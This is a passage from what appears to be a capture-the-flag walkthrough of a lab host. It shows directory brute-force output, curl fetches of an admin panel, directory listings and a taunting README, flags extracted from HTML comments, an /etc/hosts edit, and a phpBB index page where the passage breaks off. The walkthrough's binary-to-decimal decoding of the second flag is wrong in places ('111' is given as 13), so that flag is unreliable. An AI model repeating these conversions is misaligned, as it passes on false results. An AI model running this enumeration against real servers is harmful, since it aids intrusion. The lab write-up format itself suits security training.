+ http://192.168.1.167/manual/en/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/en/misc/ ----
+ http://192.168.1.167/manual/en/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/en/mod/ ----
+ http://192.168.1.167/manual/en/mod/index.html (CODE:200|SIZE:22377)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/en/programs/ ----
+ http://192.168.1.167/manual/en/programs/index.html (CODE:200|SIZE:6897)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/en/ssl/ ----
+ http://192.168.1.167/manual/en/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/es/developer/ ----
+ http://192.168.1.167/manual/es/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/es/faq/ ----
+ http://192.168.1.167/manual/es/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/es/howto/ ----
+ http://192.168.1.167/manual/es/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/es/misc/ ----
+ http://192.168.1.167/manual/es/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/es/mod/ ----
+ http://192.168.1.167/manual/es/mod/index.html (CODE:200|SIZE:22752)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/es/programs/ ----
+ http://192.168.1.167/manual/es/programs/index.html (CODE:200|SIZE:6298)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/es/ssl/ ----
+ http://192.168.1.167/manual/es/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/fr/developer/ ----
+ http://192.168.1.167/manual/fr/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/fr/faq/ ----
+ http://192.168.1.167/manual/fr/faq/index.html (CODE:200|SIZE:3604)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/fr/howto/ ----
+ http://192.168.1.167/manual/fr/howto/index.html (CODE:200|SIZE:7136)                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/fr/misc/ ----
+ http://192.168.1.167/manual/fr/misc/index.html (CODE:200|SIZE:5407)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/fr/mod/ ----
+ http://192.168.1.167/manual/fr/mod/index.html (CODE:200|SIZE:24329)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/fr/programs/ ----
+ http://192.168.1.167/manual/fr/programs/index.html (CODE:200|SIZE:7185)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/fr/ssl/ ----
+ http://192.168.1.167/manual/fr/ssl/index.html (CODE:200|SIZE:5191)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ja/developer/ ----
+ http://192.168.1.167/manual/ja/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ja/faq/ ----
+ http://192.168.1.167/manual/ja/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ja/howto/ ----
+ http://192.168.1.167/manual/ja/howto/index.html (CODE:200|SIZE:7723)                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ja/misc/ ----
+ http://192.168.1.167/manual/ja/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ja/mod/ ----
+ http://192.168.1.167/manual/ja/mod/index.html (CODE:200|SIZE:23684)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ja/programs/ ----
+ http://192.168.1.167/manual/ja/programs/index.html (CODE:200|SIZE:6897)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ja/ssl/ ----
+ http://192.168.1.167/manual/ja/ssl/index.html (CODE:200|SIZE:5274)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ko/developer/ ----
+ http://192.168.1.167/manual/ko/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ko/faq/ ----
+ http://192.168.1.167/manual/ko/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ko/howto/ ----
+ http://192.168.1.167/manual/ko/howto/index.html (CODE:200|SIZE:6373)                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ko/misc/ ----
+ http://192.168.1.167/manual/ko/misc/index.html (CODE:200|SIZE:5197)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ko/mod/ ----
+ http://192.168.1.167/manual/ko/mod/index.html (CODE:200|SIZE:21813)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ko/programs/ ----
+ http://192.168.1.167/manual/ko/programs/index.html (CODE:200|SIZE:5773)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ko/ssl/ ----
+ http://192.168.1.167/manual/ko/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/tr/developer/ ----
+ http://192.168.1.167/manual/tr/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/tr/faq/ ----
+ http://192.168.1.167/manual/tr/faq/index.html (CODE:200|SIZE:3612)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/tr/howto/ ----
+ http://192.168.1.167/manual/tr/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/tr/misc/ ----
+ http://192.168.1.167/manual/tr/misc/index.html (CODE:200|SIZE:5339)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/tr/mod/ ----
+ http://192.168.1.167/manual/tr/mod/index.html (CODE:200|SIZE:22660)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/tr/programs/ ----
+ http://192.168.1.167/manual/tr/programs/index.html (CODE:200|SIZE:7405)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/tr/ssl/ ----
+ http://192.168.1.167/manual/tr/ssl/index.html (CODE:200|SIZE:5196)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/zh-cn/developer/ ----
+ http://192.168.1.167/manual/zh-cn/developer/index.html (CODE:200|SIZE:5995)                                                                                                                                  
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/zh-cn/faq/ ----
+ http://192.168.1.167/manual/zh-cn/faq/index.html (CODE:200|SIZE:3571)                                                                                                                                        
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/zh-cn/howto/ ----
+ http://192.168.1.167/manual/zh-cn/howto/index.html (CODE:200|SIZE:6566)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/zh-cn/misc/ ----
+ http://192.168.1.167/manual/zh-cn/misc/index.html (CODE:200|SIZE:4807)                                                                                                                                       
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/zh-cn/mod/ ----
+ http://192.168.1.167/manual/zh-cn/mod/index.html (CODE:200|SIZE:22261)                                                                                                                                       
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/zh-cn/programs/ ----
+ http://192.168.1.167/manual/zh-cn/programs/index.html (CODE:200|SIZE:6833)                                                                                                                                   
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/zh-cn/ssl/ ----
+ http://192.168.1.167/manual/zh-cn/ssl/index.html (CODE:200|SIZE:5042)                                                                                                                                        
                                                                                                                                                                                                               
(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)
                                                                               
-----------------
END_TIME: Wed Apr 26 00:12:36 2017
DOWNLOADED: 505029 - FOUND: 113
root@kali:~# 

```

Retrieving the page code with curl

```bash

root@kali:~# curl http://192.168.1.167/control/index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Startmin - Admin</title>

    <!-- Bootstrap Core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- MetisMenu CSS -->
    <link href="css/metisMenu.min.css" rel="stylesheet">

    <!-- Timeline CSS -->
    <link href="css/timeline.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/startmin.css" rel="stylesheet">

    <!-- Morris Charts CSS -->
    <link href="css/morris.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
<style>
.fluid-ratio-resize { 
	max-width: 1000px; /* actual img width */
	*height: 1200px; /* actual img height - IE7 */
	background-image: url(panel.jpg);
	background-size: cover;
	background-position: center;
}
.fluid-ratio-resize:after {
	content: " ";
	display: block; 
	width: 75%; 
	padding-top: 4.918%; /* slope */
	height: 1000px; /* start height */
}
</style>
</head>
<body>

<div id="wrapper">

    <!-- FL46_1:urh8fu3i039rfoy254sx2xtrs5wc6767w -->
    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
        <div class="navbar-header">
            <a class="navbar-brand" href="#">Startmin</a>
        </div>

        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
        </button>

        <!-- Top Navigation: Left Menu -->
        <ul class="nav navbar-nav navbar-left navbar-top-links">
            <li><a href="#"><i class="fa fa-home fa-fw"></i> DNS Control</a></li>
        </ul>

        <!-- Top Navigation: Right Menu -->
        <ul class="nav navbar-right navbar-top-links">
            <li class="dropdown navbar-inverse">
                <a class="dropdown-toggle" data-toggle="dropdown" href="#">
                    <i class="fa fa-bell fa-fw"></i> <b class="caret"></b>
                </a>
                <ul class="dropdown-menu dropdown-alerts">
                    <li>
                        <a href="#">
                            <div>
                                <i class="fa fa-comment fa-fw"></i> New Comment
                                <span class="pull-right text-muted small">4 minutes ago</span>
                            </div>
                        </a>
                    </li>
                    <li class="divider"></li>
                    <li>
                        <a class="text-center" href="#">
                            <strong>See All Alerts</strong>
                            <i class="fa fa-angle-right"></i>
                        </a>
                    </li>
                </ul>
            </li>
            <li class="dropdown">
                <a class="dropdown-toggle" data-toggle="dropdown" href="#">
                    <i class="fa fa-user fa-fw"></i>MegustaAdmin<b class="caret"></b>
                </a>
                <ul class="dropdown-menu dropdown-user">
                    <li><a href="#"><i class="fa fa-user fa-fw"></i> User Profile</a>
                    </li>
                    <li><a href="#"><i class="fa fa-gear fa-fw"></i> Settings</a>
                    </li>
                    <li class="divider"></li>
                    <li><a href="#"><i class="fa fa-sign-out fa-fw"></i> Logout</a>
                    </li>
                </ul>
            </li>
        </ul>

        <!-- Sidebar -->
        <div class="navbar-default sidebar" role="navigation">
            <div class="sidebar-nav navbar-collapse">

                <ul class="nav" id="side-menu">
                    <li class="sidebar-search">
                        <div class="input-group custom-search-form">
                            <input type="text" class="form-control" placeholder="Search...">
                                <span class="input-group-btn">
                                    <button class="btn btn-primary" type="button">
                                        <i class="fa fa-search"></i>
                                    </button>
                                </span>
                        </div>
                    </li>
                    <li>
                        <a href="#" class="active"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a>
                    </li>
                    <li>
                        <a href="#"><i class="fa fa-sitemap fa-fw"></i> <span class="fa arrow"></span></a>
                        <ul class="nav nav-second-level">
                            <li>
                                <a href="#">NS Records</a>
                            </li>
                            <li>
                                <a href="#">MX Records <span class="fa arrow"></span></a>
                                <ul class="nav nav-third-level">
                                    <li>
                                        <a href="#">Zone Files</a>
                                    </li>
                                </ul>
                            </li>
                        </ul>
                    </li>
                </ul>

            </div>
        </div>
    </nav>

    <!-- Page Content -->
    <div id="page-wrapper">
        <div class="container-fluid">

            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">DNS Control Panel</h1>
                </div>
            </div>
            <div class="fluid-ratio-resize"></div>
            <!-- M3gusta said he hasn't had time to get this w0rKING.
            Don't think he's quite in the 20n3 these days since his MadBro made that 7r4n5f3r, Just Couldnt H@cxk Da D0Not5topMe.ctf --!>            

        </div>
    </div>

</div>

<!-- jQuery -->
<script src="js/jquery.min.js"></script>

<!-- Bootstrap Core JavaScript -->
<script src="js/bootstrap.min.js"></script>

<!-- Metis Menu Plugin JavaScript -->
<script src="js/metisMenu.min.js"></script>

<!-- Custom Theme JavaScript -->
<script src="js/startmin.js"></script>

</body>
</html>
root@kali:~# curl http://192.168.1.167/control/LICENSE
Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "{}"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. We also recommend that a
      file or class name and description of purpose be included on the
      same "printed page" as the copyright notice for easier
      identification within third-party archives.

   Copyright 2013-2015 Iron Summit Media Strategies, LLC

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

root@kali:~# curl http://192.168.1.167/games/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /games</title>
 </head>
 <body>
<h1>Index of /games</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
root@kali:~# 

root@kali:~# curl http://192.168.1.167/control/js/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /control/js</title>
 </head>
 <body>
<h1>Index of /control/js</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/control/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="README.MadBro">README.MadBro</a></td><td align="right">2017-04-03 17:17  </td><td align="right">544 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="bootstrap.min.js">bootstrap.min.js</a></td><td align="right">2017-04-03 15:32  </td><td align="right"> 35K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="dataTables/">dataTables/</a></td><td align="right">2017-04-02 17:51  </td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="flot-data.js">flot-data.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right"> 37K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="flot/">flot/</a></td><td align="right">2017-04-02 17:51  </td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="jquery.min.js">jquery.min.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right"> 82K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="metisMenu.min.js">metisMenu.min.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">1.8K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="morris-data.js">morris-data.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">2.5K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="morris.min.js">morris.min.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right"> 35K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="raphael.min.js">raphael.min.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right"> 89K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="startmin.js">startmin.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">1.2K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
root@kali:~# 

root@kali:~# curl http://192.168.1.167/control/js/README.MadBro
###########################################################
# MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
# M4K3 5UR3 2 S3TUP Y0UR /3TC/H05T5 N3XT T1M3 L0053R...   #
# 1T'5 D0Not5topMe.ctf !!!!                               #
# 1M 00T4 H33R..                                          #
# MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
###########################################################

                FL101110_10:111101011101
                1r101010q10svdfsxk1001i1
                11ry100f10srtr1100010h10
root@kali:~# 

```

In http://192.168.1.167/control/index.html: FL46_1:urh8fu3i039rfoy254sx2xtrs5wc6767w

In http://192.168.1.167/control/js/README.MadBro:

it's in binary, and converted to decimal

FL101110_10:1111010111011r101010q10svdfsxk1001i111ry100f10srtr1100010h10
101110 -> 46
10 -> 2
1111010111011 -> 30931
101010 -> 42
10 -> 2
1001 -> 9
111 -> 13
100 -> 4
10 -> 2
1100010 -> 98
10 -> 2
FL46_2:30931r42q2svdfsxk9i13ry4f2srtr98h2

we insert D0Not5topMe.ctf into /etc/hosts

```bash

root@kali:~# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

#ctf
192.168.1.167 D0Not5topMe.ctf
root@kali:~# 

```

This time opening with curl the homepage, there is a PhpBB instance

```bash

root@kali:~# curl http://D0Not5topMe.ctf
<!DOCTYPE html>
<html dir="ltr" lang="en-gb">
<head>

<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1" />

<title>MegustaGameo - Index page</title>

	<link rel="alternate" type="application/atom+xml" title="Feed - MegustaGameo" href="/app.php/feed?sid=0411ba1f77073b6a0097e2f277b8b0d1">			<link rel="alternate" type="application/atom+xml" title="Feed - New Topics" href="/app.php/feed/topics?sid=0411ba1f77073b6a0097e2f277b8b0d1">				

<!--
	phpBB style name: prosilver
	Based on style:   prosilver (this is the default phpBB3 style)
	Original author:  Tom Beddard ( http://www.subBlue.com/ )
	Modified by:
-->

<link href="./assets/css/font-awesome.min.css?assets_version=2" rel="stylesheet">
<link href="./styles/prosilver/theme/stylesheet.css?assets_version=2" rel="stylesheet">
<link href="./styles/prosilver/theme/en/stylesheet.css?assets_version=2" rel="stylesheet">




<!--[if lte IE 9]>
	<link href="./styles/prosilver/theme/tweaks.css?assets_version=2" rel="stylesheet">
<![endif]-->





</head>
<body id="phpbb" class="nojs notouch section-index ltr ">


<div id="wrap" class="wrap">
	<a id="top" class="top-anchor" accesskey="t"></a>
	<div id="page-header">
		<div class="headerbar" role="banner">
					<div class="inner">

			<div id="site-description" class="site-description">
				<a id="logo" class="logo" href="./index.php?sid=0411ba1f77073b6a0097e2f277b8b0d1" title="Board index"><span class="site_logo"></span></a>
				<h1>MegustaGameo</h1>
				<p>GameoGameoGameo</p>
				<p class="skiplink"><a href="#start_here">Skip to content</a></p>
			</div>

									<div id="search-box" class="search-box search-header" role="search">
				<form action="./search.php?sid=0411ba1f77073b6a0097e2f277b8b0d1" method="get" id="search">
				<fieldset>
					<input name="keywords" id="keywords" type="search" maxlength="128" title="Search for keywords" class="inputbox search tiny" size="20" value="" placeholder="Search…" />
					<button class="button button-search" type="submit" title="Search">
						<i class="icon fa-search fa-fw" aria-hidden="true"></i><span class="sr-only">Search</span>
					</button>
					<a href="./search.php?sid=0411ba1f77073b6a0097e2f277b8b0d1" class="button button-search-end" title="Advanced search">
						<i class="icon fa-cog fa-fw" aria-hidden="true"></i><span class="sr-only">Advanced search</span>
					</a>
					<input type="hidden" name="sid" value="0411ba1f77073b6a0097e2f277b8b0d1" />

				</fieldset>
				</form>
			</div>
						
			</div>
					</div>
				<div class="navbar" role="navigation">
	<div class="inner">

	<ul id="nav-main" class="nav-main linklist" role="menubar">

		<li id="quick-links" class="quick-links dropdown-container responsive-menu" data-skip-responsive="true">
			<a href="#" class="dropdown-trigger">
				<i class="icon fa-bars fa-fw" aria-hidden="true"></i><span>Quick links</span>
			</a>
			<div class="dropdown">
				<div class="pointer"><div class="pointer-inner"></div></div>
				<ul class="dropdown-contents" role="menu">
					
											<li class="separator"></li>
																									<li>
								<a href="./search.php?search_id=unanswered&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" role="menuitem">
									<i class="icon fa-file-o fa-fw icon-gray" aria-hidden="true"></i><span>Unanswered topics</span>
								</a>
							</li>
							<li>
								<a href="./search.php?search_id=active_topics&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" role="menuitem">
									<i class="icon fa-file-o fa-fw icon-blue" aria-hidden="true"></i><span>Active topics</span>
								</a>
							</li>
